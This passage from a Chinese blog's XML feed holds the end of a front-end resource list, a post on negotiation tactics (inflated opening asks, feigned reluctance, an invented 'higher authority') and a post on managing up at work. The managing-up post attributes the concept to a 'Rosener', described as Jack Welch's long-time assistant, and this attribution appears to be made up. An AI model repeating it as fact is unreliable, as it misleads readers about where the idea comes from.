href="https://www.infoq.cn/topic/Front-end">https://www.infoq.cn/topic/Front-end</a></li><li>daily.dev：<a href="https://daily.dev/">https://daily.dev/</a><br><a name="Cilss"></a></li></ul><h3 id="技术博客"><a href="#技术博客" class="headerlink" title="技术博客"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e6%8a%80%e6%9c%af%e5%8d%9a%e5%ae%a2">技术博客</a></h3><ul><li>掘金：<a href="https://juejin.cn/frontend">https://juejin.cn/frontend</a></li><li>腾讯前端 IMWEB：<a href="http://imweb.io/">http://imweb.io</a></li><li>腾讯 Web 前端团队 Alloy Team：<a href="http://www.alloyteam.com/">http://www.alloyteam.com</a></li><li>淘宝前端团队：<a href="http://taobaofed.org/">http://taobaofed.org</a></li><li>百度 Web 前端研发部：<a href="http://fex.baidu.com/">http://fex.baidu.com</a></li><li>京东凹凸实验室：<a href="https://aotu.io/">https://aotu.io</a></li><li>360 奇舞团：<a href="https://75team.com/">https://75team.com</a></li><li>七牛团队技术博客：<a href="http://blog.qiniu.com/">http://blog.qiniu.com</a></li><li>有赞技术团队：<a href="https://tech.youzan.com/tag/front-end/">https://tech.youzan.com/tag/front-end/</a></li><li>百度 EFE Tech：<a href="https://efe.baidu.com/">https://efe.baidu.com/</a></li><li>css-tricks：<a href="https://css-tricks.com/archives">https://css-tricks.com/archives</a></li><li>web.dev：<a href="https://web.dev/blog/">https://web.dev/blog/</a><br><a name="Yq4i2"></a></li></ul><h3 id="学习要点"><a href="#学习要点" class="headerlink" title="学习要点"></a><a href="https://code-learning-gamma.vercel.app/#/./%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF/%E9%B1%BC%E7%9A%AE%E5%87%BA%E5%93%81-%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF?id=%e5%ad%a6%e4%b9%a0%e8%a6%81%e7%82%b9">学习要点</a></h3><ul><li>前期学习以培养兴趣为主，不要过于追求深层理解。</li><li>前端学习不能靠死记硬背，要多敲代码、多做项目实践。</li><li>不要急于求成，踏实积累才是硬道理。</li></ul><br /><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>优势谈判</title>
      <link href="/2023/09/01/mind/you-shi-tan-pan/"/>
      <url>/2023/09/01/mind/you-shi-tan-pan/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>摘要：优势谈判，指的是在谈判过程中，主动把握谈判节奏，最终让对方感觉自己获胜的谈判模式。很多人都陷入一个误区，认为：谈判的胜利就是自己获胜。其实，谈判的真正目的不是主宰对方，而是让对方感觉也有所收获。要知道，对方会给你你想要的东西，但是不是在被你支配的时候，也不是在被你制服的时候，而是在你能够给对方他们也想要的东西的时候。<br />分类：#辩论<br><a name="Dlf0i"></a></p><h2 id="🌵-1-什么是优势谈判？"><a href="#🌵-1-什么是优势谈判？" class="headerlink" title="🌵 | 1.什么是优势谈判？"></a>🌵 | 1.什么是优势谈判？</h2><p><br /><strong>优势谈判，并不是双赢谈判。</strong>双赢谈判者总是说两个人在争同一只橙子。他们最终商定最好的办法就是把橙子均分为两半，然后每个人都得到他们真心想要的一半。为了确保公平，他们决定一个人负责切，另一个人优先选。然而，当双方在谈判中讨论各自根本的需求时，他们发现一个人只想用果肉榨汁，另一个人只想用果皮烤蛋糕。但是，<strong>现实情况更多是：当人们坐下来开始谈判时，你们双方想要的东西大概率是一样的。</strong>不要指望会有一个双赢的解决方案从天而降。</p><p><strong>优势谈判，指的是在谈判过程中，主动把握谈判节奏，最终让对方感觉自己获胜的谈判模式。</strong>很多人都陷入一个误区，认为：谈判的胜利就是自己获胜。其实，谈判的真正目的不是主宰对方，而是<strong>让对方感觉也有所收获</strong>。要知道，对方会给你你想要的东西，但是不是在被你支配的时候，也不是在被你制服的时候，而是在你能够给对方他们也想要的东西的时候。</p><p>如何成为一个优势谈判者呢？接下来从开局谈判、中场谈判和终局谈判三个方面介绍一些使用技巧。<br><a name="Se5jR"></a></p><h2 id="🌵-2-开局谈判技巧"><a href="#🌵-2-开局谈判技巧" class="headerlink" title="🌵 | 2.开局谈判技巧"></a>🌵 | 2.开局谈判技巧</h2><p><br />谈判的开局很重要，随着谈判的进行，你会发现每一步进展都依赖于你在最初阶段所创造的气氛。</p><p>在谈判的开始，可以使用以下 5 个技巧：<br />1 狮子大开口；<br />2 不接受第一次报价；<br />3 装作退缩的样子；<br />4 不要发生对抗；<br />5 表现得不情愿一些。<br><a name="OjpC5"></a></p><h3 id="🥦-技巧-1：狮子大开口"><a href="#🥦-技巧-1：狮子大开口" class="headerlink" title="🥦 技巧 1：狮子大开口"></a>🥦 技巧 1：狮子大开口</h3><p><br />在开局提出要求时，要记住：<strong>向对方索取的应远多于你所期望得到的</strong>。而且，你<strong>越不熟悉的对手，越要抬高要价</strong>。这样做，有以下 3 条原因：</p><p>1<strong>获取更多收益。</strong> 当你提高要价时，其实也是在<strong>抬高你所提供的服务或产品的价值感</strong>（增加估值）。如果你在申请一份工作，要求的薪水明显高出你预期能得到的，你就会在人事主管的头脑中植入你值那么多钱的想法。 <br />2<strong>创造更多谈判空间。</strong> 如果都没有溢价，哪里有谈判的空间呢？如果这次谈判是你和对方的首次合作，<strong>你所能做出的让步越大，就越显得你有合作精神</strong>。很多初出茅庐的谈判者，总害怕要价太高会导致谈判的崩盘，从而以一个最低价开场。事实上，别人还要议价，这会不断压缩你自己的利益。 <br />3<strong>提高谈判成功率。</strong> 当你提高要价，对方成功砍价时，会<strong>营造出对方胜利的氛围</strong>。擅长谈判的人都知道，谈判一开始的要价总是走极端，随着谈判的展开，双方都会不断朝着中间地带靠拢，然后商定出一个折中的方案，最后都可以宣称在谈判中或得了胜利。</p><p>如何提高要价呢？提高多少合适呢？答案是，<strong>以你的目标价格为中心，报出与对方开价相反但幅度相同的初始价。</strong> 例如：你的一个员工问她能否花 400 美元买一张新桌子。你认为 325 美元（-75）比较合理。你应该告诉她，你不希望她的花费超过 250 美元（-75）。</p><p>还要记住，如果你的要价非常高，就要<strong>暗示对方还有讲价的余地哦</strong>！<br><a name="GXr2S"></a></p><h3 id="🥦-技巧-2：不接受第一次报价"><a href="#🥦-技巧-2：不接受第一次报价" class="headerlink" title="🥦 技巧 2：不接受第一次报价"></a>🥦 技巧 2：不接受第一次报价</h3><p><br />看完技巧 1，想必聪明的你已经知道为何不要接受第一次报价了。</p><p>如果在第一次要价的时候，就选择了成交，那么一般你会产生两种反应：<br />1 我原本可以做得更好——“气死了，本来可以再讲一讲价的！”<br />2 一定是出了什么错——“这家伙，如此爽快，是不是坑了我？”</p><p>优势谈判者都非常小心，<strong>尽量避免陷入急于说“是”的陷阱</strong>，因为那样会自动在对方的脑海中触发这个想法：“我本可以做得更好，等下次吧！下次一定不能让这小子占便宜了！”<br><a name="NMbAV"></a></p><h3 id="🥦-技巧-3：装作退缩的样子"><a href="#🥦-技巧-3：装作退缩的样子" class="headerlink" title="🥦 技巧 3：装作退缩的样子"></a>🥦 技巧 3：装作退缩的样子</h3><p><br />当面临对方的狮子大开口时，<strong>不要好面子，不要好面子，不要好面子</strong>——很多人都会好面子，面对高昂的价格，装出一副我无所谓的感觉。</p><p>优势谈判者知道，你应该毫无例外地退缩一下——好像自己被吓了一跳的样子，以此回应对方的报价。即使你没有与对方面对面交谈，你也应通过某种方式表达你的震惊。在打电话时发出惊叹声也是一种极其有效的方式。</p><p>如果你表现得晏然自若，怎么着？是不是我开价太低了？<br><a name="ldcbc"></a></p><h3 id="🥦-技巧-4：不要发生对抗"><a href="#🥦-技巧-4：不要发生对抗" class="headerlink" title="🥦 技巧 4：不要发生对抗"></a>🥦 技巧 4：不要发生对抗</h3><p><br /><strong>和气生财。</strong>你在谈判开始的几分钟所说的话通常会决定谈判的气氛，不要在一开始就制造出紧张的局面。在谈判之初，你一定要谨言慎行。如果对方的立场与你完全相左，不要争论。<strong>争论总是会加剧对方证明自己正确的愿望</strong>。你<strong>最好一开始先认可对方的观点</strong>，随后再设法运用“感觉，感受，发现（Feel，Felt，Found）”公式扭转对抗局面——“我完全理解你此刻的感觉。许多人都有过一模一样的感受。然而……”</p><p>这种表达方式，有 2 点好处：</p><p>1 不会伤了对方的面子；<br />2 给与了自己思考的时间。<br><a name="eqotU"></a></p><h3 id="🥦-技巧-5：表现得不情愿一些"><a href="#🥦-技巧-5：表现得不情愿一些" class="headerlink" title="🥦 技巧 5：表现得不情愿一些"></a>🥦 技巧 5：表现得不情愿一些</h3><p><br />优势谈判者知道，通过运用“不情愿的卖家法”，你在谈判开始前就扩大了谈判范围。</p><p>在销售上，总是存在一个<strong>“离场”价</strong>，即销售人员绝不可能答应的价格。另一方并不知道“离场”价是多少，所以他们必须设法探出，搜寻更多信息。买家必须采用一些谈判招数，试探出销售人员的离场价。当你装作“不情愿的买家”时，销售人员一般不会直接从期望价下调至离场价。情况是这样的：<strong>当你装作“不情愿的买家”时，销售人员通常的典型做法是让出他的谈判空间的一半。</strong><br><a name="eItwx"></a></p><h2 id="🌵-3-中场谈判的技巧"><a href="#🌵-3-中场谈判的技巧" class="headerlink" title="🌵 | 3.中场谈判的技巧"></a>🌵 | 3.中场谈判的技巧</h2><p><br />谈判顺利开展，如何在谈判进行期间获取主动权呢？<br><a name="pzWqP"></a></p><h3 id="🥦-技巧-1：找一个更高权威"><a href="#🥦-技巧-1：找一个更高权威" class="headerlink" title="🥦 技巧 1：找一个更高权威"></a>🥦 技巧 1：找一个更高权威</h3><p><br />当面对别人的开价时，可以找一个<strong>“更高的权威”</strong>作为领导，这个领高最好是一个<strong>虚拟的</strong>，可以是“委员会”、“市场部”等。这样会表明本次谈判的成功与否，自己说了并不算。这样做有 2 点好处：</p><p>1<strong>为自己争取空间。</strong>当你有一个领导时，如果面对对方提出的高价，可以回复自己需要请示一下领导。通过创造一个必须寻求批准的“更高权威”，就可以不再顾及做决定的压力，从容不迫地审议相关的业务谈判。<br />2<strong>为自己开脱。</strong>成交由老板拍板，其实自己是站在对手那边的，回去的时候“我”可以再帮“你”和“老板”讲讲情，让他尽量答应你提出来的价格。</p><p>千万<strong>不要好面子，不要好面子，不要好面子</strong>——那种上来就表明自己可以拍板的人，都马上将自己置于了谈判的弱势地位。可以简称为“谈判傻子”。</p><p>那么如果别人对你使这招，怎么破局呢？</p><p>1<strong>就别让他产生这种想法。</strong> 在谈判开始之前，就让对方承认，如果对报价十分满意的话，当场就可以做出决定，从而消除对方诉诸“更高权威”的可能性。<br />2<strong>吹捧他。</strong> 如果对方是一个很自负的人，就和他说：“你的主管部门想必也会听从你的意见吧！”一个自视甚高的人经常犯的错误就是骄傲地告诉你他不需要得到任何人的认可。</p><p>如果对方逼迫你马上要做出一个答复。那么可以和他签订一个<strong>“有条件”的合约</strong>。明确告知对方你会做决定，但要让对方明白，除非你有足够的时间进行内部协商，否则答案就是无法交易。假如他们层层加码，用一级又一级的上级对付你，那就采取同样的做法，坚持最初的价格，再引入你的“更高权威”。</p><p><em>插入一个</em><strong><em>判断对方是否对交易感兴趣的技巧</em></strong><em>：</em><br />如果你带客户去看房时，客户走到哪都会发出“噢噢噢”和“啊啊啊”的赞叹声，好像他们喜欢它的一切，他们是不会想买的。真有兴趣购买的客户会说：“嗯，厨房没有我们喜欢的那么大……那种壁纸太难看……我们可能最终会把那堵墙打掉……”这种人才是真心想买的。所有认真的买家都抱怨价格不合适。所以，<strong>交易最大的问题不是别人的异议，而是别人的漠不关心。</strong><br><a name="QvmSS"></a></p><h3 id="🥦-技巧-2：不要想着别人会还你人情"><a href="#🥦-技巧-2：不要想着别人会还你人情" class="headerlink" title="🥦 技巧 2：不要想着别人会还你人情"></a>🥦 技巧 2：不要想着别人会还你人情</h3><p><br /><strong>你所做出的让步会迅速贬值。</strong>你所买的物品可能会在很多年后升值，但在讨价还价的过程中，你所作出的任何让步都会很快贬值。优势谈判者知道，<strong>在谈判中你每次向对方作出让步，都应该立即要求对方作出相应让步</strong>。你送给对方的人情会迅速贬值。两小时后，它的价值将会衰减到微不足道。</p><p>所以，就<strong>不要设想别人会在事后还你人情</strong>，同时，<strong>在干活前谈好价格</strong>。<br><a name="OeU8Z"></a></p><h3 id="🥦-技巧-3：别主动降价"><a href="#🥦-技巧-3：别主动降价" class="headerlink" title="🥦 技巧 3：别主动降价"></a>🥦 技巧 3：别主动降价</h3><p><br /><strong>价永远要别人坎，不要自己降。</strong>不要认为双方各退一步是公平的，谈判会顺着妥协而更进一步，也就意味着，你要一直退步。</p><p><strong>可以鼓励对方降价。</strong>当对方进行降价，然后自己装作不情愿的样子答应时，会让对方感觉自己赢了。<br><a name="scSzp"></a></p><h3 id="🥦-技巧-4：步步为营"><a href="#🥦-技巧-4：步步为营" class="headerlink" title="🥦 技巧 4：步步为营"></a>🥦 技巧 4：步步为营</h3><p><br /><strong>当谈判遇到阻力时，可以将大目标拆解为小目标，步步为营。</strong> 当谈判遇到僵局时，可以运用“搁置术”：咱们可以先把这件事放一边，谈谈其他问题，好吗？然后，<strong>通过解决小问题，为谈判积蓄动力，再慢慢将大问题化解</strong>。谈判优势者应当明白，当双方就一些小问题达成共识后，对方就更容易被说服。</p><p><strong>如果谈判马上要崩盘了，那么赶紧找一个“客观”的第三方，进行协调。</strong>第三方，充当了一个客观的角色，可以让双方都更容易认同其观点。（P.S.<strong>对陷入死胡同局面出现的可能性保持开放心态</strong>，只有当你愿意离开时，你才能充分发挥你作为优势谈判者的威力。否则，你最终可能会被迫放弃一些自己本来可以得到的东西。）<br><a name="k8GRd"></a></p><h3 id="🥦-技巧-5：一定要索取回报"><a href="#🥦-技巧-5：一定要索取回报" class="headerlink" title="🥦 技巧 5：一定要索取回报"></a>🥦 技巧 5：一定要索取回报</h3><p><br />由于你的让步会迅速贬值，所以<strong>在你做出让步时，一定要向对方索取回报</strong>。这样做有 2 点好处：</p><p>1 提升了自己所作出的让步的价值。<br />2 阻止了对方零敲碎打不断向你索取的意图。<br><a name="vg7rG"></a></p><h2 id="🌵-4-终局谈判技巧"><a href="#🌵-4-终局谈判技巧" class="headerlink" title="🌵 | 4.终局谈判技巧"></a>🌵 | 4.终局谈判技巧</h2><p><br />谈判来到了拍板的时刻，如何掌控主动权呢？<br><a name="qzFFM"></a></p><h3 id="🥦-技巧-1：使用好人-x2F-坏人法"><a href="#🥦-技巧-1：使用好人-x2F-坏人法" class="headerlink" title="🥦 技巧 1：使用好人&#x2F;坏人法"></a>🥦 技巧 1：使用好人&#x2F;坏人法</h3><p><br />我们都知道，警察在审讯犯人时，会先让一名警察充当“坏人”——表现的非常凶；然后再将“坏警察”支走，换一个温和的“好警察”，装作站在犯人这一边的样子，“哥们，唉，他就那样，脾气很差，我们也忍不了他。不过，兄弟看你人也不错，为了你考虑，还是招了吧，这样我回头给你再求求情，可以处罚的轻一些。”这样犯人可能会很快被打动。这就是一个好人&#x2F;坏人法的案例。</p><p>好人&#x2F;坏人法比你想的还要常见，<strong>当你和两个或两个以上的人打交道时，就要小心对方使了这招</strong>。</p><p><a name="f6DaT"></a></p><h3 id="🥦-技巧-2：蚕食法"><a href="#🥦-技巧-2：蚕食法" class="headerlink" title="🥦 技巧 2：蚕食法"></a>🥦 技巧 2：蚕食法</h3><p><br /><strong>即使你认可了全部条款，仍可以获得更多。</strong>比如，你买车时，销售人员总会在全过程中不断添加一些杂七杂八的额外产品，提高这辆车的利润。这种<strong>蚂蚁啃骨头</strong>的做法，在谈判后期可以更加容易地说服对方，从而获得一些你想要的东西。<br><a name="nmuUT"></a></p><h3 id="🥦-技巧-3：减小让步的幅度"><a href="#🥦-技巧-3：减小让步的幅度" class="headerlink" title="🥦 技巧 3：减小让步的幅度"></a>🥦 技巧 3：减小让步的幅度</h3><p><br /><strong>不要每次都降一样的幅度。</strong>如果在每次谈判中，你都降价 200 元，那么你将会面临无数次的砍价，因为对方会觉得只要他坎一次价，你就会让步 200。</p><p><strong>最后一次让价，幅度要小。</strong>不要在最后一次让价中，做出很大的退步，将底价露出来。这样会让对方觉得，你之前的利润如此大，再让 10 块钱吧！其实，只有你知道，再让步 10 块，就真的要亏本了。如果你没有做出让步，对方就会觉得你很小气，那么高的利润，再降 10 块都舍不得。</p><p>总之，<strong>永远都不要因为对方要求你提出底价，或者自称“不喜欢讨价还价”就全盘托出自己的全部筹码。要尽量缩减自己的让步幅度，让对方以为这就是你所能接受的极限了。</strong></p><p><a name="ShvGi"></a></p><h3 id="🥦-技巧-4：撤销让步"><a href="#🥦-技巧-4：撤销让步" class="headerlink" title="🥦 技巧 4：撤销让步"></a>🥦 技巧 4：撤销让步</h3><p><br /><strong>如果你发现别人在和你软磨硬泡，则可以假装撤回自己之前的让步。</strong>比如，如果对方总是让你再降一些价格，那么你可以假装询问自己的最高权威，然后撤回之前的让步，讲价格提到更高。<br><a name="eAKB0"></a></p><h3 id="🥦-技巧-5：最后来点甜水"><a href="#🥦-技巧-5：最后来点甜水" class="headerlink" title="🥦 技巧 5：最后来点甜水"></a>🥦 技巧 5：最后来点甜水</h3><p><br />如果对方最后硬要你再做出一些让步，那么可以<strong>在谈判的最后，再小小地给对方一点甜头尝尝</strong>。哪怕是一个很小的让步，都有作用，因为让步的时机此时更重要。</p><p>在谈判结束后，不要自鸣得意，不要炫耀自己的谈判有多么成功。而是要多多夸赞你的对手，无论你认为他表现得有多么糟糕。这样可以为了下一次的谈判做好铺垫。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 思维 </category>
          
          <category> mind </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>向上管理的艺术</title>
      <link href="/2023/09/01/mind/xiang-shang-guan-li-de-yi-zhu/"/>
      <url>/2023/09/01/mind/xiang-shang-guan-li-de-yi-zhu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><br />摘要：💼 在职场中，与上级建立良好的关系并有效地向上管理是取得成功的关键之一。本文将总结与归纳关于向上管理的重要要点，并通过案例和经验分享，帮助读者理解如何正确汇报工作、建立和谐的上下级关系以及实现共同提升 💪💼🎉。<br />分类：#职场</p><p>每个人对向上管理的理解可能都不同。有人说，我根本没有管理过我的老板，都是老板在管理我，每天训我骂我，拿着小鞭子赶着我干活；有人说，我和我的老板是平等关系，干什么都是商量着来。</p><p><strong>良好的上下级关系应该是怎样的呢？</strong>正确的上下级关系应该遵循基于<strong>相互尊重</strong>和<strong>互赢互利</strong>的原则。领导者应赋予下属权力和资源，并给予充分的信任和支持；下属应尊重领导者的权威，积极配合工作。双方应建立良好的沟通和反馈机制，共同协调工作进程。正确的上下级关系能够促进组织目标的实现，激发下属的潜力，并建立良好的工作环境。<br /><strong>那到底什么是向上管理呢？</strong>向上管理是指与上级进行<strong>有效沟通和协作</strong>，以实现个人职业目标并支持上级的工作目标。它不同于溜须拍马或盲目跪舔，而是建立合作关系，通过战略配合和融合自身目标与作风，共同进步。</p><p>“向上管理”是谁提出来的呢？向上管理这个概念是由一位名叫罗塞纳（Rosener）的女士提出的。她是一位著名的管理学家，曾任美国通用电气公司（General Electric）CEO 杰克·韦尔奇（Jack Welch）的工作助理。罗塞纳女士通过自己在助理岗位上的 14 年经验，总结并提出了向上管理的理论和实践方法。她的研究成果被整理成书籍并广泛传播，对职场管理者和员工的向上沟通与管理起到了重要的指导作用。</p><p><strong>为什么要进行向上管理？</strong>企业的性质要求向上管理。<br /><strong>各有己见。</strong>首先我们要清楚一点，企业不同于学校、家庭，企业是由具有不同背景、不同特征的人组成。在一个企业中，每个人都有自己的职能、职责，相应也有自己的目标。<strong>很多时候大家的目标可能不尽相同</strong>，设想一下，你跟你的老板在一块工作的时候，你们的背景不同，沟通方式不同，工作目标也不同，那这个时候如何与上级保持良好的沟通，并保证双方步调一致就显得尤为重要。<br /><strong>争取资源。</strong>随着工作职级的上升，我们所要面对的工作任务也越来越复杂，同时可能需要推荐好几个项目，这就意味着我们除了要完成上级安排的工作，还需要深入、全面思考自己的工作内容，并有可能对老板提出相关的建议，有的时候我们还需要去争取老板手上那些很有限的资源，完成自己负责的项目，那在这个时候就尤为的需要向上管理。<strong>工作资源的分配权利在你上司的手上</strong>。因此，当你需要获得工作的资源时，就需要对你的上司进行管理。实际上，这就是说要与你上司进行“完美沟通”。</p><p>如果我们将这种沟通进一步拆解来看的话，向上管理大概包括三句话：<br />1 从战略上配合上级的工作目标与工作作风；<br />2 并将其与自身的目标和作风融合起来；<br />3 辅助上司并实现个人的职业目标。</p><p>如果要进行再一步的总结，这三句话其实就是三个要点：<strong>配合上级</strong>，<strong>融合自身</strong>，<strong>共同进步</strong>。</p><p>放在具体实操上来说，我们用几个关键词来进行说明：<br><a name="C0mdr"></a></p><h2 id="🥦-关键词-1：因材施“管”"><a href="#🥦-关键词-1：因材施“管”" class="headerlink" title="🥦 关键词 1：因材施“管”"></a>🥦 关键词 1：因材施“管”</h2><p><br />由于人的性格不同，<strong>老板也分为不同的类型</strong>。针对不同类型的老板，可以采用以下的向上管理的方法：<br />1<strong>事无巨细的老板：</strong>与这种风格的老板工作，要与他保持同步，让他知道工作状态，但也要保留自己的主动性和创造力。在目标设定、工作回顾和工作展望等关键时刻与老板约定时间，展示工作进展并让他放心，帮助他避免过多的微观管理，让他能够关注更大方向的问题。<br />2<strong>只管大方向的老板：</strong>对于这种老板，重要的是确保工作目标的确认，避免做出不符合他期望的工作。同时，在重要时间节点和关键进展时及时向他汇报。与他保持言简意赅的沟通，只汇报关键问题，避免占用他过多时间和精力。<br />3<strong>合作不愉快的老板：</strong>如果与新老板之间存在合作不愉快的问题，首先需要分析问题根源，是因为对业务理解不同还是工作风格不同。对于新来的不熟悉业务的老板，应主动帮助他尽快熟悉业务，提供数据分析、行业关键信息等支持。定期与他沟通，总结工作进展，提供清晰的信息以便他更好地理解工作。为了更有利于他的理解，可以将数据整理成 Excel 表格、图表分析和结论，并提供下一步的工作计划。<br><a name="ZkAP6"></a></p><h2 id="🥦-关键词-2：保持信任"><a href="#🥦-关键词-2：保持信任" class="headerlink" title="🥦 关键词 2：保持信任"></a>🥦 关键词 2：保持信任</h2><p><br /><strong>信任感是建立良好工作关系的关键</strong>，<strong>信任的本质其实就是靠谱</strong>。<strong>靠谱，不代表每一件事情你都要做，也不代表每一件事情你都要做成。靠谱，更多地是指：事事有反馈，件件有回应，不管效果正负——能做就是能做；做不了就是做不了，不要欺骗，不要勉强，更不要拖着；如果目前正在忙，回复一个稍等，让老板人有所安。</strong>具体来说：<br />1<strong>兑现承诺：</strong>重要的是始终兑现自己的承诺，不过度承诺。避免在项目进行中出现各种困难时向领导寻求资源并无法按时完成任务。可在项目开始前仔细考虑潜在的困难，制定谨慎的计划，并在规定时间内如约完成任务。可以学会给自己留有缓冲期，如果一个文件自己周三可以搞定，如果时间允许可以答应老板周五进行交付，留给一些时间给自己、给意外、给获取靠谱的标签。<br />2<strong>勇于承担责任：</strong>当项目发生未预料的问题导致延期时，及时向领导汇报情况，与领导保持同步。如果延期是项目组的责任，勇于承担责任，避免敷衍和搪塞，老板通常会理解具体原因。这种勇于承担责任的态度可以树立与领导间的信任，促进良好的合作关系。</p><p><a name="p99d6"></a></p><h2 id="🥦-关键词-3：“拍好马屁”"><a href="#🥦-关键词-3：“拍好马屁”" class="headerlink" title="🥦 关键词 3：“拍好马屁”"></a>🥦 关键词 3：“拍好马屁”</h2><p><br />在职场上，拍马屁并不是简单地讨好上司，而是一种<strong>高级的技巧和思维方式</strong>。这并不意味着虚假奉承或附和，而是通过巧妙的方法与上级建立有效的信任关系。<br />拍马屁的关键在于<strong>展现积极态度</strong>、承担责任、有效沟通和真诚尊重。首先，要对工作充满热情，积极主动完成任务，展现专业素养和高效能力。其次，当面临困难或错误时，及时承认并积极寻找解决方案，与上司沟通并提出有效方法。同时，与上级保持良好沟通渠道，及时汇报工作进展和问题，寻求意见和指导，保持坦诚和透明，理解上司期望，并努力满足要求。<br />记住，<strong>在大多数情况下，你和领导是一荣俱荣，一损俱损的</strong>。“领导”好，“大家”才能好。<br><a name="kmhM3"></a></p><h2 id="🥦-关键词-4：适应上级"><a href="#🥦-关键词-4：适应上级" class="headerlink" title="🥦 关键词 4：适应上级"></a>🥦 关键词 4：适应上级</h2><p><br />与上级相处，首先我们要了解上级，学会解读上司的能力、性格和职业态度，并根据这些了解来适应他们。很多时候，我们与上级之间会存在很多不匹配的情况，但是要知道，此时<strong>需要我们适应上司，而不是让上司适应我们</strong>。上司是组织信任的人，我们的选择应该是支持他们。<strong>即使我们不喜欢上司这个人，也应该尊重他们，因为我们尊重的不是个人，而是组织对“这些人”的授权和管理体系对他们的认可。</strong><br />少抱怨，多干事，如果遇见并不那么契合的伙伴，就当做一次对自己的历练和磨砺吧！<br><a name="HysuQ"></a></p><h2 id="🥦-关键词-5：找好定位"><a href="#🥦-关键词-5：找好定位" class="headerlink" title="🥦 关键词 5：找好定位"></a>🥦 关键词 5：找好定位</h2><p><br />要建立和谐的上下级关系，首先要充分信任上司，相信他们的决策和指令都有其原因和思考。及时有时候遇到上司的决策并不明智，<strong>不要当众对领导进行质疑</strong>，因为<strong>作为组织管理者，不仅仅要制定正确的计划，还要保持自己的领导权威</strong>。所以，面对分歧，不要当众质疑或反抗上司的命令，而是在事后私下询问背后的用意，如果确实存在问题，再进行改正。<br />同时，给自己明确的定位，<strong>不越位，不篡权</strong>，“不超越自己的职责范围”——不干出格的事。一个人如果不清楚自己的角色，自以为是就难免会越位。当我们越位的时候，你的上司会受到威胁，你的职位就不稳了。定位就像打篮球，上场之前必须要先明确自己的位置，你是前锋还是后卫？一位从办公室助理做起，通过数年努力，最终成为一家上市公司总裁的成功人士。总结自己的经验是说，我担任过许多职位，不论是什么职位。当处于这个职位后，我要做的第一件事就是给自己定位，了解这个职位的要求，然后将这些要求作为我的工作目标。我要思考的是如何实现这些目标，然后按照计划进行。因此，清晰了解自己在公司中所处的位置是我们必须要做的。<br><a name="gm5Am"></a></p><h2 id="🥦-关键词-6：正确汇报"><a href="#🥦-关键词-6：正确汇报" class="headerlink" title="🥦 关键词 6：正确汇报"></a>🥦 关键词 6：正确汇报</h2><p><br />要进行有效的向上汇报和实现向上管理，首先需要建立有效的<strong>工作汇报机制</strong>。<br />在汇报工作时，应<strong>主动汇报进度、需求、业绩、意外和困难、建议和规划</strong>等五个方面的内容。<br />a 汇报进度是我们的责任，无论工作顺利还是困难，都要及时向上司反馈。<br />b 汇报需求时，要明确自己的需求并向上司提出请求，尽量与上司协商寻求解决方案。<br />c 汇报业绩时，除了汇报已完成的成果，还要说明目标、实际完成情况和未完成的原因。<br />d 遇到意外情况，要第一时间汇报，并请求支持和解决方案。<br />e 此外，在汇报中提出建议和规划时，要清晰描述原因和好处，以增加汇报的价值。<br />汇报工作不仅要高效，还要选择<strong>适当的沟通时机</strong>。选择上司心情好的时候汇报，避免在他们心情不好或刚批评完下属后汇报。尽量选择上司不忙的时间，例如工作日的上午十点半至十一点半。要考虑上司的工作习惯，观察他们的表情或咨询其他同事，以确定最佳汇报时机。同时，不同的沟通内容也有最佳时机，如履行承诺、道歉和祝福等。时机选择不当，即使内容正确也可能被误解。在沟通中，要以简洁的语言、清晰的重点和有效的结构来汇报，以提高汇报的效果。</p><p>在职场中，我们可能会遇到上司不完美、甚至阻碍工作的困境。但作为下属，向上管理是我们的责任。如果能巧妙地帮助上司提高，不仅工作更顺利，还能获得赏识和晋升机会。如何做到呢？<strong>给上司安全感！</strong>一方面要让上司看到你的努力工作，另一方面要与上司沟通，让他了解你的工作进展，并服从他的安排。向上管理的过程也是建立信任的过程，这里有一个秘诀，那就是请你记住，任何情况下，我们都不要让自己的上司感到难堪。即使你是对的，你也要维护上司的面子，同时不要对他撒谎，因为你一次的不诚实可能会使你永远失去上司的信任。 <br />总结来说，正确认识上下级关系、建立和谐的上下级关系，通过有效的工作汇报和沟通，实现你和上司共同提升，是向上管理的最高境界！🙌🎉🚀</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 思维 </category>
          
          <category> mind </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
